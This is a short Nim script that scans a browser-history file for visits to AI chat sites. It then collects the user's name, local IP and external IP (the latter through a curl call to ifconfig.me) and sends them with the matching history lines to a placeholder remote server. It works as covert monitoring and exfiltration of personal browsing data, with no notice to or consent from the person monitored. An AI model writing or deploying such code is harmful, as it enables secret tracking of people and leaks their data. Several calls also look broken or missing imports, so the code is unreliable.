import os, strutils, sequtils, httpclient, json, net

let aiWebsites = ["chat.openai.com", "claude.ai"]

proc isAiWebsite(url: string): bool =
  for site in aiWebsites:
    if site in url:
      return true
  return false

proc readHistory(filePath: cstring): seq[string] =
  try:
    let history = readFile(filePath)
    result = history.splitLines
  except OSError:
    echo "Failed to read file."
    result = @[]

proc getUser(): string =
  return getEnv("USERNAME")

proc getLocalIP(): string =
  for iface in getInterfaces():
    for addr in iface.addresses:
      if addr.family == AddressFamily.IPv4 and not addr.isLoopback:
        return $addr.address
  return "Local IP not found"

proc getExternalIP(): string =
  try:
    let response = execProcess("curl -s ifconfig.me", options = {poUsePath})
    return response.strip()
  except:
    return "External IP not available"

type Report = object
  username: string
  ipLocal: string
  ipExternal: string
  detections: seq[string]

proc generateReport(detectedSites: seq[string]): Report =
  result.username = getUser()
  result.ipLocal = getLocalIP()
  result.ipExternal = getExternalIP()
  result.detections = detectedSites

proc sendToServer(report: Report) =
  let client = newHttpClient()
  let data = %*{
    "username": report.username,
    "ip_local": report.ipLocal,
    "ip_external": report.ipExternal,
    "accesses": report.detections
  }
  try:
    let response = client.request(
      "http://SERVER_IP:PORT/report",
      httpMethod = HttpPost,
      headers = {"Content-Type": "application/json"},
      body = $data
    )
    echo "Report sent: ", response.body
  except:
    echo "Failed to send report"

proc monitorAndReport(historyFilePath: cstring) =
  let history = readHistory(historyFilePath)
  var detections: seq[string] = @[]

  for line in history:
    if isAiWebsite(line):
      detections.add(line)

  if detections.len > 0:
    let report = generateReport(detections)
    sendToServer(report)
  else:
    echo "No AI sites detected."

let historyFilePath = "/path/to/history.txt"
monitorAndReport(historyFilePath)